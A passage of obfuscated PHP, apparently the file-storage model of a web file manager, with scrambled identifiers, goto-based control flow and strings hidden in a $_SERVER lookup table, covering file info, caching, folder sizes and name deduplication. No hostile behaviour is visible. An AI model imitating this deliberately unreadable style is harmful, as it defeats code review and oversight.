return $D×‡à¶¿½; goto Cåé…ß›×Ò; b®³ˆù·: $this->setNamePinyin($dœŠÉ˜ãæƒ, $Cñ¶Çœ°Õ‹[$AŠÛğ… ª¸[28]], !1); $this->updateModifyTime($C†ê‰åƒ[$AŠÛğ… ª¸[478]]); $D×‡à¶¿½ = $this->where(array($AŠÛğ… ª¸[410] => $dœŠÉ˜ãæƒ))->data($Cñ¶Çœ°Õ‹)->save(); goto EšÍÜõâÚì; fÅ¼ÃÀÇ¨Ä: $c†äó°³°ò = $this->fileNameExist($C†ê‰åƒ[$AŠÛğ… ª¸[478]], $DÙ¿æß”Òß); if ($c†äó°³°ò && $c†äó°³°ò != $dœŠÉ˜ãæƒ) { return !1; } $Cñ¶Çœ°Õ‹ = array($AŠÛğ… ª¸[413] => $DÙ¿æß”Òß, $AŠÛğ… ª¸[552] => USER_ID); goto eíÌÌÉåò; Cåé…ß›×Ò: } public function setNamePinyin($AáŸ¸Á…âè, $e‡§÷†¾Œæ, $CÏîŸ¼¬  = true) { $d²ˆÆ¾—á =& $_SERVER[œº]; $Aáó”ì­ƒ = Input::check($e‡§÷†¾Œæ, $d²ˆÆ¾—á[556]); if ($CÏîŸ¼¬  && !$Aáó”ì­ƒ) { return; } if (!$Aáó”ì­ƒ) { $this->metaSet($AáŸ¸Á…âè, $d²ˆÆ¾—á[444], null); $this->metaSet($AáŸ¸Á…âè, $d²ˆÆ¾—á[443], null); return; } $eÑó‘‰Ô²˜ = array($d²ˆÆ¾—á[444] => str_replace($d²ˆÆ¾—á[50], $d²ˆÆ¾—á[33], Pinyin::encode($e‡§÷†¾Œæ)), $d²ˆÆ¾—á[443] => Pinyin::encode($e‡§÷†¾Œæ, $d²ˆÆ¾—á[557])); $this->metaSet($AáŸ¸Á…âè, $eÑó‘‰Ô²˜); } public function getContent($dÖ—®¾äß) { goto EÅƒæù¯ƒ; AÀèèª™¦: if (!$D¸¬¾¬ààÈ[$A½ïí†ˆÖò[76]]) { return $A½ïí†ˆÖò[33]; } return IO::getContent($D¸¬¾¬ààÈ[$A½ïí†ˆÖò[76]]); goto D¾„¨¹÷÷; EÅƒæù¯ƒ: $A½ïí†ˆÖò =& $_SERVER[œº]; $D¸¬¾¬ààÈ = $this->fileInfoGet($dÖ—®¾äß); if (!$D¸¬¾¬ààÈ) { return !1; } goto bóš“ÜÄÌ; bóš“ÜÄÌ: if ($D¸¬¾¬ààÈ[$A½ïí†ˆÖò[78]] == 0) { return $A½ïí†ˆÖò[33]; } $d™¥´«´ùÑ = $A½ïí†ˆÖò[1976] . $D¸¬¾¬ààÈ[$A½ïí†ˆÖò[170]]; if ($D¸¬¾¬ààÈ[$A½ïí†ˆÖò[78]] <= 1024 * 10) { $bÂ–†‡Çšâ = Cache::get($d™¥´«´ùÑ); if (!$bÂ–†‡Çšâ) { $bÂ–†‡Çšâ = IO::getContent($D¸¬¾¬ààÈ[$A½ïí†ˆÖò[76]]); Cache::set($d™¥´«´ùÑ, $bÂ–†‡Çšâ); } return $bÂ–†‡Çšâ; } goto AÀèèª™¦; D¾„¨¹÷÷: } public function setDesc($bÑÍùº´Ëá, $bÅâ†Áİé) { $F¾¢ÕìóÓÒ =& $_SERVER[œº]; Model($F¾¢ÕìóÓÒ[533])->eventAddDesc($bÑÍùº´Ëá, $bÅâ†Áİé); return $this->metaSet($bÑÍùº´Ëá, $F¾¢ÕìóÓÒ[431], $bÅâ†Áİé); } public function setContent($EÇôã¾Ë´†, $cğÂ›ƒ‚Ë¨ = '') { goto c‚ŒóÛƒòò; Cé¼åŒŞ‡‡: if (!$eÍµÓÁ‘‹• || !$a±â†ÂÇ¾Ë) { return !1; } $F·¥‰çÏ‰Ä = Model($FäÒ›œøÆ[450])->addFileByContent($cğÂ›ƒ‚Ë¨, $a±â†ÂÇ¾Ë[$FäÒ›œøÆ[28]]); $aÚ¤¸©µ„ = $this->fileHistory($a±â†ÂÇ¾Ë, $F·¥‰çÏ‰Ä[$FäÒ›œøÆ[447]], $F·¥‰çÏ‰Ä[$FäÒ›œøÆ[78]]); goto BæßÆìÌî„; c‚ŒóÛƒòò: $FäÒ›œøÆ =& $_SERVER[œº]; $a±â†ÂÇ¾Ë = $this->sourceInfo($EÇôã¾Ë´†); $eÍµÓÁ‘‹• = $this->fileInfoGet($EÇôã¾Ë´†); goto Cé¼åŒŞ‡‡; BæßÆìÌî„: if (!$aÚ¤¸©µ„) { return Model($FäÒ›œøÆ[450])->remove($F·¥‰çÏ‰Ä[$FäÒ›œøÆ[447]]); } $this->folderSizeReset($a±â†ÂÇ¾Ë[$FäÒ›œøÆ[478]]); return !0; goto dêçö¤˜×; dêçö¤˜×: } public function fileSubstr($D»¼ç¿–Ş, $B”ˆ²“ëœŠ, $f’²Û¦Û¯) { $f –÷ô‰†ã = $this->fileInfoGet($D»¼ç¿–Ş); if (!$f –÷ô‰†ã) { return !1; } return IO::fileSubstr($f –÷ô‰†ã[$_SERVER[œº][76]], $B”ˆ²“ëœŠ, $f’²Û¦Û¯); } public function fileInfoGet($aãÅÛÓ÷–Í) { goto c¡¤›”éõ¯; a¦©ÆôÏÉ: $C‰´ù±í = Model($b²ÁÈ©¾ò‹[450])->fileInfo($e„…ğÓÚÑ[$b²ÁÈ©¾ò‹[447]]); if ($C‰´ù±í) { $C‰´ù±í[$b²ÁÈ©¾ò‹[28]] = $e„…ğÓÚÑ[$b²ÁÈ©¾ò‹[28]]; } self::$cacheFileInfo[$eØÊ¾Ñ­] = $C‰´ù±í; goto e³ëõ¶š¬; c÷Êñöê­: $eØÊ¾Ñ­ = $b²ÁÈ©¾ò‹[453] . $e„…ğÓÚÑ[$b²ÁÈ©¾ò‹[447]]; $EÖÒ„ö£² = _get(self::$cacheFileInfo, $eØÊ¾Ñ­); if ($EÖÒ„ö£²) { return $EÖÒ„ö£²; } goto a¦©ÆôÏÉ; e³ëõ¶š¬: return $C‰´ù±í; goto A¥øÍøİÕ; c¡¤›”éõ¯: $b²ÁÈ©¾ò‹ =& $_SERVER[œº]; $e„…ğÓÚÑ = $this->sourceInfo($aãÅÛÓ÷–Í); if (!$e„…ğÓÚÑ || $e„…ğÓÚÑ[$b²ÁÈ©¾ò‹[403]]) { return !1; } goto c÷Êñöê­; A¥øÍøİÕ: } private function folderChildrenNumber($CöÓ×ˆ½æ¸) { $f°·÷Ä¥ÕÀ =& $_SERVER[œº]; $eÓÍ¯‘„©Û = $this->sourceInfo($CöÓ×ˆ½æ¸); $Eâ¾¹Èç•à = array($f°·÷Ä¥ÕÀ[553] => array($f°·÷Ä¥ÕÀ[512], $eÓÍ¯‘„©Û[$f°·÷Ä¥ÕÀ[487]] . $CöÓ×ˆ½æ¸ . $f°·÷Ä¥ÕÀ[513]), $f°·÷Ä¥ÕÀ[422] => intval($eÓÍ¯‘„©Û[$f°·÷Ä¥ÕÀ[423]]), $f°·÷Ä¥ÕÀ[546] => 1); $a–ËõßßÇ = $this->where($Eâ¾¹Èç•à)->count(); $cº¡±Ê¥óô = $this->where($Eâ¾¹Èç•à)->where(array($f°·÷Ä¥ÕÀ[546] => 0))->count(); return array($f°·÷Ä¥ÕÀ[82] => $cº¡±Ê¥óô, $f°·÷Ä¥ÕÀ[83] => $a–ËõßßÇ); } public function pathInfo($bß£‰óæìÙ, $c¹äåŠÆç = false) { goto CŠÀëŠÓ£š; DŒ†¸ø¯©×: $Eš¶áÕ…³ = $fá‰ÁßÖ±È[439] . intval($c¹äåŠÆç) . $fá‰ÁßÖ±È[440] . $bß£‰óæìÙ; $F¯Ìê›¿‚· = _get(self::$cachePathInfo, $Eš¶áÕ…³); if ($F¯Ìê›¿‚·) { return $F¯Ìê›¿‚·; } goto f‹©¨Šëî»; f‹©¨Šëî»: $B³¶¼ª²«› = $this->sourceInfo($bß£‰óæìÙ); if (!$B³¶¼ª²«›) { return !1; } $B³¶¼ª²«› = $this->_listDataApplyItem($B³¶¼ª²«›, $c¹äåŠÆç); goto Aê‹†õ­¤à; Aê‹†õ­¤à: self::$cachePathInfo[$Eš¶áÕ…³] = $B³¶¼ª²«›; return $B³¶¼ª²«›; goto a´ˆ‚‘É­Ø; CŠÀëŠÓ£š: $fá‰ÁßÖ±È =& $_SERVER[œº]; $c¹äåŠÆç = !1; $bß£‰óæìÙ = intval($bß£‰óæìÙ); goto DŒ†¸ø¯©×; a´ˆ‚‘É­Ø: } public static $cachePathInfoMore = array(); public function pathInfoMore($d¥´ãÈ“çŠ) { goto eÄŸÒ£ô÷; döÀ¦ÒİÖš: $AòÆŒ–¦œ = $this->pathInfo($d¥´ãÈ“çŠ); if (!$AòÆŒ–¦œ) { return !1; } if ($AòÆŒ–¦œ[$b‹ŞéŸé¦ß[403]] == $b‹ŞéŸé¦ß[87]) { $AòÆŒ–¦œ[$b‹ŞéŸé¦ß[81]] = $this->folderChildrenNumber($d¥´ãÈ“çŠ); } goto EÖÃ’Ş÷Ö; EÖÃ’Ş÷Ö: self::$cachePathInfoMore[$d¥´ãÈ“çŠ] = $AòÆŒ–¦œ; return $AòÆŒ–¦œ; goto cÅ÷æ„¯ºò; eÄŸÒ£ô÷: $b‹ŞéŸé¦ß =& $_SERVER[œº]; $FŞ†—Ÿˆ = _get(self::$cachePathInfoMore, $d¥´ãÈ“çŠ); if ($FŞ†—Ÿˆ) { return $FŞ†—Ÿˆ; } goto döÀ¦ÒİÖš; cÅ÷æ„¯ºò: } public function sourceInfo($b¹åéñŠ¾) { goto b»±“ÉÓÈ¶; b»±“ÉÓÈ¶: $d¢’ê‹­¦ =& $_SERVER[œº]; if (!$b¹åéñŠ¾) { return array(); } $b¹åéñŠ¾ = intval($b¹åéñŠ¾); goto CÜ·²İÅ•‹; FÖÔ”ŠÉŞã: $dæÕÊ§ªã‡ = $this->where(array($d¢’ê‹­¦[395] => $b¹åéñŠ¾))->find(); self::$cacheSourceInfo[$e¤Ùõ¼‚šÙ] = $dæÕÊ§ªã‡; return self::$cacheSourceInfo[$e¤Ùõ¼‚šÙ]; goto c¦ ­ùİˆÃ; CÜ·²İÅ•‹: $e¤Ùõ¼‚šÙ = $d¢’ê‹­¦[438] . $b¹åéñŠ¾; $A¹…ˆ‚î²ª = _get(self::$cacheSourceInfo, $e¤Ùõ¼‚šÙ); if ($A¹…ˆ‚î²ª) { return $A¹…ˆ‚î²ª; } goto FÖÔ”ŠÉŞã; c¦ ­ùİˆÃ: } public function sourceCacheClear($Cœ›ğ‹§œ‰ = false) { self::cacheClear($Cœ›ğ‹§œ‰); } public static function cacheClear($FÊœàø…œÅ = false) { $B¨½—ÏŠÆ© =& $_SERVER[œº]; if ($FÊœàø…œÅ == !1) { goto câ×øêÈÎ; c‡›‚ò‘ÂÊ: return; goto E›ÕƒŸ¶¬; câ×øêÈÎ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto fóÄ¤Õ…¿ƒ; fóÄ¤Õ…¿ƒ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto c‡›‚ò‘ÂÊ; E›ÕƒŸ¶¬: } unset(self::$cacheSourceInfo[$B¨½—ÏŠÆ©[438] . $FÊœàø…œÅ]); unset(self::$cachePathInfoMore[$FÊœàø…œÅ]); unset(self::$cachePathInfo[$B¨½—ÏŠÆ©[1977] . $FÊœàø…œÅ]); unset(self::$cachePathInfo[$B¨½—ÏŠÆ©[1978] . $FÊœàø…œÅ]); } public function metaSet($E’¥¾æ–À, $Dñ´×ÍŠ–– = null, $eæ‘Ó‹„„í = null) { $F‡ŒØÍº›à = parent::metaSet($E’¥¾æ–À, $Dñ´×ÍŠ––, $eæ‘Ó‹„„í); if ($F‡ŒØÍº›à) { $this->sourceCacheClear($E’¥¾æ–À); } return $F‡ŒØÍº›à; } public function pathInfoByPath($fÖ´êÕ¼ †, $Cš÷á¹àè) { $eÏ®à´¹Êˆ =& $_SERVER[œº]; $d¶ŞÊ²™¬¡ = !$Cš÷á¹àè ? array() : explode($eÏ®à´¹Êˆ[8], trim($Cš÷á¹àè, $eÏ®à´¹Êˆ[8])); $e¥©ñÂÄùë = $fÖ´êÕ¼ †; foreach ($d¶ŞÊ²™¬¡ as $C ·ÅˆÄê) { $eÉ Æ±ÜŠ = array($eÏ®à´¹Êˆ[478] => $e¥©ñÂÄùë, $eÏ®à´¹Êˆ[28] => $C ·ÅˆÄê); $B¿˜Á «´ = $this->where($eÉ Æ±ÜŠ)->select(); if (!$B¿˜Á «´) { return !1; } $B¿˜Á «´ = array_sort_by($B¿˜Á «´, $eÏ®à´¹Êˆ[423]); $e¥©ñÂÄùë = $B¿˜Á «´[0][$eÏ®à´¹Êˆ[395]]; } return $this->pathInfo($e¥©ñÂÄùë, !0); } protected function updateModifyTime($Fî½¬ß‹Š) { goto cõğœÍä¸£; b£‚ˆ®•‚ò: foreach ($Fî½¬ß‹Š as $FóàÂÀ‚ø° => $eÀ…ª‹äœ) { $Fî½¬ß‹Š[$FóàÂÀ‚ø°] = intval($eÀ…ª‹äœ); $this->sourceCacheClear($eÀ…ª‹äœ); } $cÕ¾•´äğ = array($cÆŠ¹—ÄÒ[395] => array($cÆŠ¹—ÄÒ[7], $Fî½¬ß‹Š)); $BâŒŒßŞµ¯ = array($cÆŠ¹—ÄÒ[552] => USER_ID, $cÆŠ¹—ÄÒ[417] => time()); goto AÉóÒÅ˜‚õ; AÉóÒÅ˜‚õ: $this->where($cÕ¾•´äğ)->save($BâŒŒßŞµ¯); goto C›ˆ³…Šª; cõğœÍä¸£: $cÆŠ¹—ÄÒ =& $_SERVER[œº]; if (!$Fî½¬ß‹Š) { return; } if (!is_array($Fî½¬ß‹Š)) { $Fî½¬ß‹Š = array($Fî½¬ß‹Š); } goto b£‚ˆ®•‚ò; C›ˆ³…Šª: } public function folderSizeReset($EÎÊßÖ²ˆ®, $a³¬ÈÙ£¿Å = false) { goto E”È‘ôœÅ; dï™Óà¶à¥: $E’ä²åŞæ = array($dìİàì¹®©[$BùñÓÙç¸[404]], $dìİàì¹®©[$BùñÓÙç¸[484]]); TaskRun::timeLimitCall($dÊ¼¢Ÿ“¶Ö, $BùñÓÙç¸[1981], $E’ä²åŞæ, 1.5); goto FÂ„®ÉŞÌÊ; DâÒ©‰ƒ: $this->where($A—ŠÈ×©Ïï)->setAdd($BùñÓÙç¸[78], $a³¬ÈÙ£¿Å); CacheLock::unlock($AÙ°¹’±Ã); $dÊ¼¢Ÿ“¶Ö = $BùñÓÙç¸[1980] . $dìİàì¹®©[$BùñÓÙç¸[404]] . $BùñÓÙç¸[4] . $dìİàì¹®©[$BùñÓÙç¸[484]]; goto dï™Óà¶à¥; c³¤›‚Š›Œ: $fŸÒ„÷õÛ‚[] = $dìİàì¹®©[$BùñÓÙç¸[395]]; $A—ŠÈ×©Ïï = array($BùñÓÙç¸[395] => array($BùñÓÙç¸[411], $fŸÒ„÷õÛ‚)); if ($a³¬ÈÙ£¿Å < 0) { $A—ŠÈ×©Ïï[$BùñÓÙç¸[78]] = array($BùñÓÙç¸[972], abs($a³¬ÈÙ£¿Å)); } goto DâÒ©‰ƒ; eƒÌí“øå‹: $AÙ°¹’±Ã = $BùñÓÙç¸[1979] . $EÎÊßÖ²ˆ®; CacheLock::lock($AÙ°¹’±Ã, 20); if ($a³¬ÈÙ£¿Å === !1) { $this->sourceCacheClear($EÎÊßÖ²ˆ®); $dìİàì¹®© = $this->sourceInfo($EÎÊßÖ²ˆ®); $A—ŠÈ×©Ïï = array($BùñÓÙç¸[394] => $EÎÊßÖ²ˆ®, $BùñÓÙç¸[422] => 0); $F£¤Å“‹± = $this->where($A—ŠÈ×©Ïï)->sum($BùñÓÙç¸[78]); $a³¬ÈÙ£¿Å = intval($F£¤Å“‹±) - intval($dìİàì¹®©[$BùñÓÙç¸[78]]); } goto fÇõ÷İ³‹§; fÇõ÷İ³‹§: if ($a³¬ÈÙ£¿Å == 0) { return CacheLock::unlock($AÙ°¹’±Ã); } $fŸÒ„÷õÛ‚ = $this->parentLevelArray($dìİàì¹®©[$BùñÓÙç¸[487]]); if (!$fŸÒ„÷õÛ‚) { $fŸÒ„÷õÛ‚ = array(); } goto c³¤›‚Š›Œ; E”È‘ôœÅ: $BùñÓÙç¸ =& $_SERVER[œº]; if ($this->statusIgnoreResetSpace) { return; } $dìİàì¹®© = $this->sourceInfo($EÎÊßÖ²ˆ®); goto eƒÌí“øå‹; FÂ„®ÉŞÌÊ: } public function folderSizeResetChildren($B‡Ö¤’Ï×õ) { goto AØÊö³åô; C¤§²äÏâğ: foreach ($B°Û§—†“ƒ as $d’«ĞŒã ) { $B›ãÆáµ½ = $d’«ĞŒã [$CĞÑÖÉóË„[478]] . $CĞÑÖÉóË„[33]; if (!isset($f÷ù«§âÎˆ[$B›ãÆáµ½])) { continue; } if ($d’«ĞŒã [$CĞÑÖÉóË„[423]] == $f÷ù«§âÎˆ[$B›ãÆáµ½][$CĞÑÖÉóË„[423]]) { $f÷ù«§âÎˆ[$B›ãÆáµ½][$CĞÑÖÉóË„[78]] += $d’«ĞŒã [$CĞÑÖÉóË„[78]]; } } foreach ($f÷ù«§âÎˆ as $d’«ĞŒã ) { $dÊÜÍÒŒÛæ = $this->parentLevelArray($d’«ĞŒã [$CĞÑÖÉóË„[487]]); foreach ($dÊÜÍÒŒÛæ as $B›ãÆáµ½) { $B›ãÆáµ½ = $B›ãÆáµ½ . $CĞÑÖÉóË„[33]; if (!isset($f÷ù«§âÎˆ[$B›ãÆáµ½])) { continue; } if ($d’«ĞŒã [$CĞÑÖÉóË„[423]] == $f÷ù«§âÎˆ[$B›ãÆáµ½][$CĞÑÖÉóË„[423]]) { $f÷ù«§âÎˆ[$B›ãÆáµ½][$CĞÑÖÉóË„[78]] += $d’«ĞŒã [$CĞÑÖÉóË„[78]]; } } } $d‚ê‘Öƒ œ = array(); goto cîÙ¨†‡ÏÖ; EÍÜ»Œáê‚: $Cğ³ĞĞË ° = array($CĞÑÖÉóË„[546] => 1, $CĞÑÖÉóË„[553] => array($CĞÑÖÉóË„[512], $Ağ÷ÓÈñ‘˜[$CĞÑÖÉóË„[487]] . $B‡Ö¤’Ï×õ . $CĞÑÖÉóË„[513])); $FÅê‰£—ÒÈ = $CĞÑÖÉóË„[1982]; $f÷ù«§âÎˆ = $this->field($FÅê‰£—ÒÈ)->where($Cğ³ĞĞË °)->select(); goto a”†·Ç×Ò˜; AØÊö³åô: $CĞÑÖÉóË„ =& $_SERVER[œº]; $this->sourceCacheClear($B‡Ö¤’Ï×õ); $Ağ÷ÓÈñ‘˜ = $this->sourceInfo($B‡Ö¤’Ï×õ); goto EÍÜ»Œáê‚; e¶¾‚ïÌö: $f÷ù«§âÎˆ[] = $Ağ÷ÓÈñ‘˜; $f÷ù«§âÎˆ = array_to_keyvalue($f÷ù«§âÎˆ, $CĞÑÖÉóË„[395]); foreach ($f÷ù«§âÎˆ as $BÇº‘ÜÕ®Ò => $d’«ĞŒã ) { $f÷ù«§âÎˆ[$BÇº‘ÜÕ®Ò][$CĞÑÖÉóË„[1983]] = $f÷ù«§âÎˆ[$BÇº‘ÜÕ®Ò][$CĞÑÖÉóË„[78]]; $f÷ù«§âÎˆ[$BÇº‘ÜÕ®Ò][$CĞÑÖÉóË„[78]] = 0; } goto C¤§²äÏâğ; cîÙ¨†‡ÏÖ: foreach ($f÷ù«§âÎˆ as $d’«ĞŒã ) { if ($d’«ĞŒã [$CĞÑÖÉóË„[78]] == $d’«ĞŒã [$CĞÑÖÉóË„[1983]]) { continue; } $d‚ê‘Öƒ œ[] = array($CĞÑÖÉóË„[395], $d’«ĞŒã [$CĞÑÖÉóË„[395]], $CĞÑÖÉóË„[78], $d’«ĞŒã [$CĞÑÖÉóË„[78]]); } $this->saveAll($d‚ê‘Öƒ œ); goto eâ£½çôÅ; a”†·Ç×Ò˜: $Cğ³ĞĞË °[$CĞÑÖÉóË„[403]] = 0; $B°Û§—†“ƒ = $this->field($FÅê‰£—ÒÈ)->where($Cğ³ĞĞË °)->select(); if (!$B°Û§—†“ƒ) { return; } goto e¶¾‚ïÌö; eâ£½çôÅ: } public function userSpaceReset($FÕÃêù… = false) { $BÙ†­ù÷Øô =& $_SERVER[œº]; $eÖÂèÆ‰ ñ = $this->where(array($BÙ†­ù÷Øô[404] => self::TYPE_USER, $BÙ†­ù÷Øô[484] => $FÕÃêù…, $BÙ†­ù÷Øô[403] => 0))->sum($BÙ†­ù÷Øô[78]); $eÖÂèÆ‰ ñ = !$eÖÂèÆ‰ ñ || $eÖÂèÆ‰ ñ <= 0 ? 0 : $eÖÂèÆ‰ ñ; Model($BÙ†­ù÷Øô[502])->userEdit($FÕÃêù…, array($BÙ†­ù÷Øô[1678] => $eÖÂèÆ‰ ñ)); } public function targetSpaceUpdate($A‹Ì¬ñ˜ˆ, $D»åŠ¾ø±) { $b“… •¯©× =& $_SERVER[œº]; if (!$D»åŠ¾ø±) { return; } if (!in_array($A‹Ì¬ñ˜ˆ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $díî¥Í÷òì = $this->targetSpaceSize($A‹Ì¬ñ˜ˆ, $D»åŠ¾ø±); if ($A‹Ì¬ñ˜ˆ == self::TYPE_USER) { Model($b“… •¯©×[502])->userEdit($D»åŠ¾ø±, array($b“… •¯©×[1678] => $díî¥Í÷òì)); } else { if ($A‹Ì¬ñ˜ˆ == self::TYPE_GROUP) { Model($b“… •¯©×[486])->groupEdit($D»åŠ¾ø±, array($b“… •¯©×[1678] => $díî¥Í÷òì)); } } } public function targetSpaceSize($fçæ³÷», $cì°ùµ¦¦í) { goto b†©ÃØğ§; a¤×Î§ÔÔÎ: $a†ÔÈÀ‰Å‡ = array_to_keyvalue($a†ÔÈÀ‰Å‡, $A¨¿ì¡©¤‘[33], $A¨¿ì¡©¤‘[395]); $a†ÔÈÀ‰Å‡ = array_unique(array_filter($a†ÔÈÀ‰Å‡)); if ($a†ÔÈÀ‰Å‡) { $bóø©‘…Ä = array($A¨¿ì¡©¤‘[410] => array($A¨¿ì¡©¤‘[411], $a†ÔÈÀ‰Å‡)); $Bæ£ê‡ÔÎ³ += floatval($this->where($bóø©‘…Ä)->sum($A¨¿ì¡©¤‘[78])); } goto F–ÁòçÅ‚Ë; F–ÁòçÅ‚Ë: $Bæ£ê‡ÔÎ³ = !$Bæ£ê‡ÔÎ³ || $Bæ£ê‡ÔÎ³ <= 0 ? 0 : $Bæ£ê‡ÔÎ³; return $Bæ£ê‡ÔÎ³; goto aÏˆ‚“ë; B­ğŠÃ¤•Î: $Bæ£ê‡ÔÎ³ = floatval($f¢¿ÅÚêÖ¾[$A¨¿ì¡©¤‘[78]]); $bóø©‘…Ä = array($A¨¿ì¡©¤‘[553] => array($A¨¿ì¡©¤‘[512], $A¨¿ì¡©¤‘[498] . $f¢¿ÅÚêÖ¾[$A¨¿ì¡©¤‘[395]] . $A¨¿ì¡©¤‘[513])); $a†ÔÈÀ‰Å‡ = Model($A¨¿ì¡©¤‘[421])->field($A¨¿ì¡©¤‘[410])->where($bóø©‘…Ä)->select(); goto a¤×Î§ÔÔÎ; b†©ÃØğ§: $A¨¿ì¡©¤‘ =& $_SERVER[œº]; $f¢¿ÅÚêÖ¾ = $this->sourceRoot($fçæ³÷», $cì°ùµ¦¦í, !0); if (!$f¢¿ÅÚêÖ¾) { return 0; } goto B­ğŠÃ¤•Î; aÏˆ‚“ë: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b¿¥ò¹‡„©) { return $this->fileTypeProfile($b¿¥ò¹‡„©, SourceModel::TYPE_USER); } public function groupFileTypeProfile($bµÓÔÂ¶ïğ) { return $this->fileTypeProfile($bµÓÔÂ¶ïğ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($eêöÂ³ƒ‡, $Fˆê¶ö¹Ü¹) { goto aÑç¾Ïã; dÂâ ï…çÙ: foreach ($A‰†²¿­ì as $dîÖÀÜ¼Æ => $d“½µ÷¦…) { $Cˆ³Ğ‡ÃÚ[$céñ‘†‘›¯[405]] = $this->fileTypeWhere($dîÖÀÜ¼Æ); $E“ĞÁÈ“’°[$dîÖÀÜ¼Æ] = array($céñ‘†‘›¯[1986] => $d“½µ÷¦…[$céñ‘†‘›¯[28]], $céñ‘†‘›¯[1987] => $this->where($Cˆ³Ğ‡ÃÚ)->count(), $céñ‘†‘›¯[548] => $this->where($Cˆ³Ğ‡ÃÚ)->sum($céñ‘†‘›¯[78])); } Cache::set($côÌ¢Ö…òé, $E“ĞÁÈ“’°, 1200); return $E“ĞÁÈ“’°; goto eª‰‡çíÈ; a¦é°ô¬öŞ: if ($bã”…¸Ñ‘Ğ) { return $bã”…¸Ñ‘Ğ; } $Cˆ³Ğ‡ÃÚ = array($céñ‘†‘›¯[546] => 0); if ($eêöÂ³ƒ‡ != !1) { $Cˆ³Ğ‡ÃÚ[$céñ‘†‘›¯[484]] = $eêöÂ³ƒ‡; $Cˆ³Ğ‡ÃÚ[$céñ‘†‘›¯[404]] = $Fˆê¶ö¹Ü¹; } goto DÉÆ¬ˆÑ; aÑç¾Ïã: $céñ‘†‘›¯ =& $_SERVER[œº]; $côÌ¢Ö…òé = $céñ‘†‘›¯[1984] . $eêöÂ³ƒ‡ . $céñ‘†‘›¯[71] . $Fˆê¶ö¹Ü¹; $bã”…¸Ñ‘Ğ = Cache::get($côÌ¢Ö…òé); goto a¦é°ô¬öŞ; DÉÆ¬ˆÑ: $E“ĞÁÈ“’° = array(); $E“ĞÁÈ“’°[$céñ‘†‘›¯[1985]] = array($céñ‘†‘›¯[1986] => LNG($céñ‘†‘›¯[1985]), $céñ‘†‘›¯[1987] => $this->where($Cˆ³Ğ‡ÃÚ)->count(), $céñ‘†‘›¯[548] => $this->where($Cˆ³Ğ‡ÃÚ)->sum($céñ‘†‘›¯[78])); $A‰†²¿­ì = KodIO::fileTypeList(); goto dÂâ ï…çÙ; eª‰‡çíÈ: } public function fileNameExist($fÍä¹è·ŞÈ, $aŠ‚ùºÜ—) { $eÒÆ‘Ê¿¢Š =& $_SERVER[œº]; $fîªæäá‚ñ = $this->where(array($eÒÆ‘Ê¿¢Š[478] => $fÍä¹è·ŞÈ, $eÒÆ‘Ê¿¢Š[28] => $aŠ‚ùºÜ—, $eÒÆ‘Ê¿¢Š[423] => 0))->find(); return is_array($fîªæäá‚ñ) ? $fîªæäá‚ñ[$eÒÆ‘Ê¿¢Š[395]] : !1; } public function childList($D“´ø•õ×) { goto f¢êóìÎÔ›; f¢êóìÎÔ›: $eÁ™Ç«Õ‡˜ =& $_SERVER[œº]; $e“Ò‰æ¢¢í = $eÁ™Ç«Õ‡˜[1962] . $D“´ø•õ×; if (isset(self::$cacheChildList[$e“Ò‰æ¢¢í])) { return self::$cacheChildList[$e“Ò‰æ¢¢í]; } goto côù¨„µšì; aÜÅ³ÂíØ: self::$cacheChildList[$e“Ò‰æ¢¢í] = $a¤„‘ìƒ¶‡; foreach ($a¤„‘ìƒ¶‡ as $déÒÜãÅÏ©) { $e“Ò‰æ¢¢í = $eÁ™Ç«Õ‡˜[438] . $déÒÜãÅÏ©[$eÁ™Ç«Õ‡˜[395]]; self::$cacheSourceInfo[$e“Ò‰æ¢¢í] = $déÒÜãÅÏ©; } return $a¤„‘ìƒ¶‡; goto f±š¿¼„›•; côù¨„µšì: $e¡‚ª¦Á™ = array($eÁ™Ç«Õ‡˜[478] => intval($D“´ø•õ×), $eÁ™Ç«Õ‡˜[423] => 0); $a¤„‘ìƒ¶‡ = $this->where($e¡‚ª¦Á™)->select(); $a¤„‘ìƒ¶‡ = $a¤„‘ìƒ¶‡ ? $a¤„‘ìƒ¶‡ : array(); goto aÜÅ³ÂíØ; f±š¿¼„›•: } public function fileNameAuto($dË¹ÂÖ£‹é, $f“²ˆ’…éô, $eàìÈÆÑ = REPEAT_RENAME, $Fùá÷÷ìæ° = false) { $AÃ‘£è¶‹± =& $_SERVER[œº]; $bŞò„ùàÀ° = array($AÃ‘£è¶‹±[478] => $dË¹ÂÖ£‹é, $AÃ‘£è¶‹±[423] => 0, $AÃ‘£è¶‹±[28] => array($AÃ‘£è¶‹±[380], $f“²ˆ’…éô . $AÃ‘£è¶‹±[381])); $cí¶ÃÏ‰× = $this->field($AÃ‘£è¶‹±[28])->where($bŞò„ùàÀ°)->select(); $bØ¿İÛ³—¨ = array_to_keyvalue($cí¶ÃÏ‰×, $AÃ‘£è¶‹±[33], $AÃ‘£è¶‹±[28]); return $this->fileNameAutoGet($bØ¿İÛ³—¨, $f“²ˆ’…éô, $eàìÈÆÑ, $Fùá÷÷ìæ°); } public function fileNameAutoGet($Aß °±‚, $EÑ¦Îò„Ğë, $E¢­„¸¥Í˜, $B„¸»Êæ²Ó) { $Bçáèè³İ› =& $_SERVER[œº]; if ($E¢­„¸¥Í˜ == REPEAT_REPLACE || !$Aß °±‚ || !in_array_not_case($EÑ¦Îò„Ğë, $Aß °±‚) || $B„¸»Êæ²Ó && $E¢­„¸¥Í˜ != REPEAT_RENAME_FOLDER) { return $EÑ¦Îò„Ğë; } if ($E¢­„¸¥Í˜ == REPEAT_SKIP) { return !1; } $Cñí‚“Õ„ = $Bçáèè³İ›[95] . get_path_ext($EÑ¦Îò„Ğë); $Cñí‚“Õ„ = $Cñí‚“Õ„ == $Bçáèè³İ›[95] || $B„¸»Êæ²Ó ? $Bçáèè³İ›[33] : $Cñí‚“Õ„; for ($EÓ–¤çø¬ = 1; $EÓ–¤çø¬ <= count($Aß °±‚) + 1; $EÓ–¤çø¬++) { $Dƒ›ÑæŒà® = substr($EÑ¦Îò„Ğë, 0, strlen($EÑ¦Îò„Ğë) - strlen($Cñí‚“Õ„)); $aÌ¿©×«Â¬ = 